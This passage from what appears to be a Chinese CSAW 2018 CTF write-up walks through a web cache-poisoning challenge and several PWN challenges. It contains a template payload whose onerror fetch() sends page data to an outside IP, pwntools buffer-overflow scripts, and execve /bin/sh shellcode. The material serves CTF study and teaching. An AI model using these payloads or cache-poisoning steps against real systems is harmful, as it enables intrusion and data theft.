Legacy&quot;,&quot;year&quot;:2010&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 25 Minutes&quot;,&quot;name&quot;:&quot;Minority Report&quot;,&quot;year&quot;:2002&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 37 Minutes&quot;,&quot;name&quot;:&quot;eXistenZ&quot;,&quot;year&quot;:1999&#125;,&#123;&quot;admin_only&quot;:true,&quot;length&quot;:&quot;22 Hours, 17 Minutes&quot;,&quot;name&quot;:&quot;[REDACTED]&quot;,&quot;year&quot;:2018&#125;]&#125;</span><br></pre></td></tr></table></figure>
+<p>修改:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;admin_only&quot;:true,&quot;length&quot;:&quot;22 Hours, 17 Minutes&quot;,&quot;name&quot;:&quot;[REDACTED]&quot;,&quot;year&quot;:2018&#125;]&#125;</span><br></pre></td></tr></table></figure>
+<p>将<code>true</code>改为<code>false</code>.可以看到在页面上显示出了结果。</p>
+<p>在观察相应头部:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">...</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">X-Varnish: 157274709</span><br><span class="line">Age: 0</span><br><span class="line">Via: 1.1 varnish-v4</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果来自Apache的响应是可缓存的，Varnish会将其存储以便更快地响应未来的请求。</p>
+<p><a href="https://docs.acquia.com/acquia-cloud/performance/varnish/" rel="external nofollow" target="_blank">https://docs.acquia.com/acquia-cloud/performance/varnish/</a></p>
+</blockquote>
+<p>X-Forwarded-Host:</p>
+<blockquote>
+<p>X-Forwarded-Host (XFH) 是一个事实上的标准首部，用来确定客户端发起的请求中使用 Host 指定的初始域名。 反向代理（如负载均衡服务器、CDN等）的域名或端口号可能会与处理请求的源头服务器有所不同，在这种情况下，X-Forwarded-Host 可以用来确定哪一个域名是最初被用来访问的。</p>
+</blockquote>
+<p>上面这些归结起来就是当服务器进行缓存时它会将客户端的请求转发到XFH指定的host上去。</p>
+<p>  现在再回过头看看我们已有的资料。我们得知main.mst是模板文件，它会利用<code></code>等对admin身份进行判断，如果我们能够劫持掉这个模板文件，使她绕过admin就可以获得到完整的项。</p>
+<p>  我们先来找到main.mst缓存的最大时间(max-age)，我们可以带着<code>X-Forwarded-Host</code>不停的请求<code>/cdn/app.js</code>，如果<code>fetch(&#39;//71aabdeb3d708872c6e00e066ae48b2669834df7.hm.vulnerable.services/cdn/main.mst&#39;)</code>能被我们控制到<code>fetch(&#39;my_server/cdn/main.mst&#39;)</code>上就成功的完成了劫持。</p>
+<p>  我们可以使用下面的脚本验证一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">X_Forwarded_Host = <span class="string">'1.2.3.4'</span> </span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    resp = requests.get(<span class="string">"http://71aabdeb3d708872c6e00e066ae48b2669834df7.hm.vulnerable.services/cdn/app.js"</span>, headers=&#123;<span class="string">'X-Forwarded-Host'</span>: X_Forwarded_Host&#125;)</span><br><span class="line">    <span class="keyword">print</span> resp.headers</span><br><span class="line">    <span class="keyword">if</span> X_Forwarded_Host <span class="keyword">in</span> resp.text:</span><br><span class="line">        <span class="keyword">print</span> resp.text</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>结果:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;Content-Length&apos;: &apos;1575&apos;, &apos;Access-Control-Allow-Headers&apos;: &apos;X-Forwarded-Host&apos;, &apos;Access-Control-Max-Age&apos;: &apos;21600&apos;, &apos;Age&apos;: &apos;0&apos;, &apos;Server&apos;: &apos;gunicorn/19.9.0&apos;, &apos;Connection&apos;: &apos;keep-alive&apos;, &apos;X-Varnish&apos;: &apos;157377770 157377768&apos;, &apos;Via&apos;: &apos;1.1 varnish-v4&apos;, &apos;Date&apos;: &apos;Wed, 19 Sep 2018 01:00:24 GMT&apos;, &apos;Access-Control-Allow-Origin&apos;: &apos;*&apos;, &apos;Access-Control-Allow-Methods&apos;: &apos;HEAD, OPTIONS, GET&apos;, &apos;Content-Type&apos;: &apos;application/javascript&apos;, &apos;Accept-Ranges&apos;: &apos;bytes&apos;&#125;</span><br><span class="line">var token = null;</span><br><span class="line"></span><br><span class="line">Promise.all([</span><br><span class="line">    fetch(&apos;/api/movies&apos;).then(r=&gt;r.json()),</span><br><span class="line">    fetch(`//1.2.3.4/cdn/main.mst`).then(r=&gt;r.text()),</span><br><span class="line">    new Promise((resolve) =&gt; &#123;</span><br><span class="line">        if (window.loaded_recapcha === true)</span><br><span class="line">            return resolve();</span><br></pre></td></tr></table></figure>
+<p>在使用浏览器刷新一下:</p>
+<p><img src="/home/tianji/Desktop/22.png" alt=""></p>
+<p>可以看到这时候请求<code>http://1.2.3.4/cdn/main.mst</code>。然后，构造好模板文件，让管理员访问即可。</p>
+<p>构造main.mst如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;header&quot;&gt;</span><br><span class="line">Hacker Movie Club</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;header admin&quot;&gt;</span><br><span class="line">Welcome to the desert of the real.</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;table class=&quot;movies&quot;&gt;</span><br><span class="line">&lt;thead&gt;</span><br><span class="line"> &lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Year&lt;/th&gt;&lt;th&gt;Length&lt;/th&gt;</span><br><span class="line">&lt;/thead&gt;</span><br><span class="line">&lt;tbody&gt;</span><br><span class="line">&#123;&#123;#movies&#125;&#125;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;&#123;&#123; name &#125;&#125;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&#123;&#123; year &#125;&#125;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&#123;&#123; length &#125;&#125;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&#123;&#123;/movies&#125;&#125;</span><br><span class="line">&lt;/tbody&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;captcha&quot;&gt;</span><br><span class="line">  &lt;div id=&quot;captcha&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;button id=&quot;report&quot; type=&quot;submit&quot; class=&quot;report&quot;&gt;&lt;/button&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;fetch(&apos;http://123.207.90.143/&apos;+&apos;&#123;&#123;#movies&#125;&#125;&#123;&#123; name &#125;&#125;&#123;&#123;/movies&#125;&#125;&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>如果使用apache或者nginx,可以使用如下代码:</p>
+<p>同时修改<code>.htaccess</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .mst</span><br></pre></td></tr></table></figure>
+<p><code>main.mst</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php Header(&quot;Access-Control-Allow-Origin: *&quot;); ?&gt;</span><br><span class="line">&lt;img src=&quot;http://my_server/?c=&#123;&#123;#movies&#125;&#125;&#123;&#123;name&#125;&#125;&#123;&#123;/movies&#125;&#125;&quot;&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure>
+<p>或者修改一下配置文件。</p>
+<p><img src="/home/tianji/Desktop/45640104-590fbb80-bacf-11e8-9201-29f2ff6fc03d.png" alt=""></p>
+<p>如果不想修改配置文件，可以使用python启动一个服务器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    # Python 3</span><br><span class="line">    from http.server import HTTPServer, SimpleHTTPRequestHandler, test as test_orig</span><br><span class="line">    import sys</span><br><span class="line">    def test (*args):</span><br><span class="line">        test_orig(*args, port=int(sys.argv[1]) if len(sys.argv) &gt; 1 else 8000)</span><br><span class="line">except ImportError: # Python 2</span><br><span class="line">    from BaseHTTPServer import HTTPServer, test</span><br><span class="line">    from SimpleHTTPServer import SimpleHTTPRequestHandler</span><br><span class="line"></span><br><span class="line">class CORSRequestHandler (SimpleHTTPRequestHandler):</span><br><span class="line">    def end_headers (self):</span><br><span class="line">        self.send_header(&apos;Access-Control-Allow-Origin&apos;, &apos;*&apos;)</span><br><span class="line">        SimpleHTTPRequestHandler.end_headers(self)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    test(CORSRequestHandler, HTTPServer)</span><br></pre></td></tr></table></figure>
+<p>然后创建<code>cdn/main.mst</code>文件即可。</p>
+<p>目录:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_89_224_redhat ~]# tree</span><br><span class="line">.</span><br><span class="line">├── cdn</span><br><span class="line">│   └── main.mst</span><br><span class="line">└── web_cache.py</span><br></pre></td></tr></table></figure>
+<p>最终结果:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_89_224_redhat ~]# python web_cache.py 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">216.165.2.32 - - [19/Sep/2018 10:06:15] &quot;GET /cdn/main.mst HTTP/1.1&quot; 200 -</span><br><span class="line">216.165.2.32 - - [19/Sep/2018 10:06:16] code 404, message File not found</span><br><span class="line">216.165.2.32 - - [19/Sep/2018 10:06:16] &quot;GET /WarGamesKung%20FurySneakersSwordfishThe%20Karate%20KidGhost%20in%20the%20ShellSerial%20Experiments%20LainThe%20MatrixBlade%20RunnerBlade%20Runner%202049HackersTRONTron:%20LegacyMinority%20ReporteXistenZflag%7BI_h0pe_you_w4tch3d_a11_th3_m0v1es%7D HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>
+<p>参考链接:</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/2585" rel="external nofollow" target="_blank">https://xz.aliyun.com/t/2585</a></li>
+</ul>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="bigboy"><a href="#bigboy" class="headerlink" title="bigboy"></a>bigboy</h2><p>payload: <code>(printf &quot;AAABBBCCCDDDEEFFFGGG\xee\xba\xf3\xca&quot;;cat)|nc pwn.chal.csaw.io 9000</code></p>
+<h2 id="get-it"><a href="#get-it" class="headerlink" title="get it"></a>get it</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line">from pwn import *</span><br><span class="line">DEBUG=False</span><br><span class="line"> </span><br><span class="line">if DEBUG:</span><br><span class="line">	p = process(&quot;./get_it&quot;)</span><br><span class="line">	pause()</span><br><span class="line">else:</span><br><span class="line">	p = remote(&apos;pwn.chal.csaw.io&apos;,9001)</span><br><span class="line"> </span><br><span class="line">give_shell = 0x4005B6</span><br><span class="line"> </span><br><span class="line">payload = &quot;A&quot;*40</span><br><span class="line">payload += p64(give_shell)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><h3 id="solve1"><a href="#solve1" class="headerlink" title="solve1"></a>solve1</h3><p>使用的shellcode。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://shell-storm.org/shellcode/files/shellcode-806.php</span><br></pre></td></tr></table></figure>
+<p>首先使用radare2来判断每一个指令的开始和结束:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ctf@ctf-virtual-machine:~/Desktop/casw/pwn$ rasm2 -k linux -b 64 -D "31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05"</span><br><span class="line">0x00000000   2                     31c0  xor eax, eax</span><br><span class="line">0x00000002  10     48bbd19d9691d08c97ff  mov rbx, 0xff978cd091969dd1</span><br><span class="line">0x0000000c   3                   48f7db  neg rbx</span><br><span class="line">0x0000000f   1                       53  push rbx</span><br><span class="line">0x00000010   1                       54  push rsp</span><br><span class="line">0x00000011   1                       5f  pop rdi</span><br><span class="line">0x00000012   1                       99  cdq</span><br><span class="line">0x00000013   1                       52  push rdx</span><br><span class="line">0x00000014   1                       57  push rdi</span><br><span class="line">0x00000015   1                       54  push rsp</span><br><span class="line">0x00000016   1                       5e  pop rsi</span><br><span class="line">0x00000017   2                     b03b  mov al, 0x3b</span><br><span class="line">0x00000019   2                     0f05  syscall</span><br></pre></td></tr></table></figure>
+<p>我们知道简短的跳转指令包括:<code>\xEB**(\XEB + 8bits的相对偏移)</code></p>
+<p>布局：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">        0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f</span><br><span class="line">rsp+ 0: |- ADDRESS TO NODE 3 -|-- NODE 2 BUFFER ------</span><br><span class="line">       00 00 00 00 00 00 00 00 48 f7 db 53 54 5f 99 52</span><br><span class="line"></span><br><span class="line">rsp+16: - NODE 2 BUFFER -----------------------------|</span><br><span class="line">       57 54 5e b0 3b 0f 05 00 00 00 00 00 00 00 00 00</span><br><span class="line"></span><br><span class="line">rsp+32: |- ADDRESS TO NODE 2 -|-- NODE 1 BUFFER ------</span><br><span class="line">       XX XX XX XX XX XX XX XX 31 c0 48 bb d1 9d 96 91</span><br><span class="line"></span><br><span class="line">rsp+48: - NODE 1 BUFFER -----------------------------|</span><br><span class="line">       d0 8c 97 ff eb YY ** 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>现在需要从<code>rsp+54</code>跳转到<code>rsp+8</code>，那么偏移offset就是<code>-46</code>或者<code>0xD2</code>, <code>-46 &amp; 0xff = 0xD2</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode_first =  <span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\xeb\xd2"</span></span><br><span class="line">shellcode_second = <span class="string">"\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span><br><span class="line"><span class="keyword">print</span> disasm(shellcode_first)</span><br><span class="line">r = remote(<span class="string">"pwn.chal.csaw.io"</span>, <span class="number">9005</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"Text for node 1:"</span>)</span><br><span class="line">r.sendline(shellcode_first)</span><br><span class="line">r.recvuntil(<span class="string">"Text for node 2:"</span>)s</span><br><span class="line">r.recvuntil(<span class="string">"node.next: 0x"</span>)</span><br><span class="line"></span><br><span class="line">rsp = int(r.recvline(), <span class="number">16</span>)</span><br><span class="line">print(hex(rsp))</span><br><span class="line">shellcode_address = p64(rsp + <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"What are your initials?"</span>)</span><br><span class="line">r.sendline(<span class="string">"XXX&gt;&gt;RBP&lt;&lt;&lt;"</span> + shellcode_address)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="solve2"><a href="#solve2" class="headerlink" title="solve2"></a>solve2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = remote(&apos;pwn.chal.csaw.io&apos;, 9005)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(&apos;node 1:&apos;,</span><br><span class="line">    &apos;\x48\x89\xe7&apos;  # mov   %rsp,%rdi</span><br><span class="line">    &apos;\x31\xf6&apos;      # xor   %esi,%esi</span><br><span class="line">    &apos;\xeb\xdb&apos;      # jmp   node 2</span><br><span class="line">)</span><br><span class="line">r.sendlineafter(&apos;node 2:&apos;,</span><br><span class="line">    &apos;AA&apos;            # (overwritten later)</span><br><span class="line">    &apos;\x99&apos;          # cdq</span><br><span class="line">    &apos;\xb0\x3b&apos;      # mov   $0x3b,%al</span><br><span class="line">    &apos;\x0f\x05&apos;      # syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&apos;node.next: &apos;)</span><br><span class="line">addr = int(r.recvline(), 16) + 0x28</span><br><span class="line">r.sendlineafter(&apos;initials?&apos;, &apos;A&apos; * 0xb + p64(addr) + &apos;/bin/sh\x00&apos;)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="solve3"><a href="#solve3" class="headerlink" title="solve3"></a>solve3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;amd64&quot;)</span><br><span class="line"></span><br><span class="line">r = remote(&quot;pwn.chal.csaw.io&quot;, 9005)</span><br><span class="line"></span><br><span class="line">sc = &quot;&quot;&quot;</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* call execve(&apos;rsp&apos;, 0, 0) */</span><br><span class="line">    push (SYS_execve) /* 0x3b */</span><br><span class="line">    pop rax</span><br><span class="line">    xor esi, esi /* 0 */</span><br><span class="line">    cdq /* rdx=0 */</span><br><span class="line">    syscall</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">r.sendline(asm(sc))</span><br><span class="line">r.sendline(&quot;x&quot;)</span><br><span class="line">r.recvuntil(&quot;node.next: &quot;)</span><br><span class="line"></span><br><span class="line">leak = int(r.recv(14)[2:], 16)</span><br><span class="line">r.sendline(b&quot;a&quot; * 11 + p64(leak + 0x28) + b&quot;/bin/sh\x00&quot;)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="solve4"><a href="#solve4" class="headerlink" title="solve4"></a>solve4</h3><p>简单的shellcode:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor rax, rax</span><br><span class="line">mov rdi, 0x68732f6e69622f2f</span><br><span class="line">xor rsi, rsi</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor rdx, rdx</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>改造, pop crx用于移除<code>\n</code>,<code>jump rsp</code>跳转到指定地址:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; Node 1</span><br><span class="line">mov rdi, 0x68732f6e69622f2f</span><br><span class="line">pop rcx</span><br><span class="line">jmp rsp</span><br><span class="line">; Node 2</span><br><span class="line">xor rsi, rsi</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor rdx, rdx</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>exploit.py:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./shellpointcode")</span></span><br><span class="line"><span class="comment">#p = gdb.debug("/home/manu/CTF/CSAW_2018/pwn/shellpointcode", '''</span></span><br><span class="line"><span class="comment">#        c</span></span><br><span class="line"><span class="comment">#''')</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwn.chal.csaw.io'</span>,<span class="number">9005</span>)</span><br><span class="line">shell1 = <span class="string">"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x59\xff\xe4"</span></span><br><span class="line">shell2 = <span class="string">"\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"</span></span><br><span class="line">node_1 = p.recvuntil(<span class="string">"(15 bytes) Text for node 1:"</span>)</span><br><span class="line">shellcode = <span class="string">"\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"</span></span><br><span class="line">p.sendline(shell1)</span><br><span class="line">node_2 = p.recvuntil(<span class="string">"(15 bytes) Text for node 2:"</span>)</span><br><span class="line">p.sendline(shell2)</span><br><span class="line">data = p.recvuntil(<span class="string">"What are your initials?\x0a"</span>)</span><br><span class="line">shellcode_addr = data.split(<span class="string">"\n"</span>)[<span class="number">2</span>].split(<span class="string">":"</span>)[<span class="number">1</span>].strip()</span><br><span class="line">addr = p64(int(shellcode_addr, <span class="number">16</span>)+<span class="number">0x28</span>)</span><br><span class="line">log.info(<span class="string">"Shellcode addr = %s"</span>%hex(int(shellcode_addr, <span class="number">16</span>)+<span class="number">0x28</span>))</span><br><span class="line">p.sendline(<span class="string">"A"</span>*<span class="number">11</span>+addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="solve5"><a href="#solve5" class="headerlink" title="solve5"></a>solve5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">    _start:</span><br><span class="line">        xor rax, rax</span><br><span class="line">        push rax</span><br><span class="line">        pop rsi</span><br><span class="line">        cdq</span><br><span class="line">        pop rdi</span><br><span class="line">        mov rdi, rsp</span><br><span class="line">        mov al, 59</span><br><span class="line">        syscall</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = <span class="string">'\x48\x31\xc0\x50\x5e\x99\x5f\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line">r = remote(<span class="string">'pwn.chal.csaw.io'</span>, <span class="number">9005</span>)</span><br><span class="line">r.recvlines(<span class="number">4</span>)</span><br><span class="line">r.sendline(p)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">'/bin/sh'</span> + <span class="string">'\x00'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'node.next: '</span>)</span><br><span class="line">leak = int(r.recvline(<span class="keyword">False</span>), <span class="number">16</span>)</span><br><span class="line">buf = leak + <span class="number">0x28</span></span><br><span class="line">r.recvlines(<span class="number">3</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span> * <span class="number">11</span> + p64(buf))</span><br><span class="line">r.recvline()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="doubleTroubble"><a href="#doubleTroubble" class="headerlink" title="doubleTroubble"></a>doubleTroubble</h2><p>Description: Did you know every Number in javascript is a float</p>
+<h1 id="REVERSEs"><a href="#REVERSEs" class="headerlink" title="REVERSEs"></a>REVERSEs</h1>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
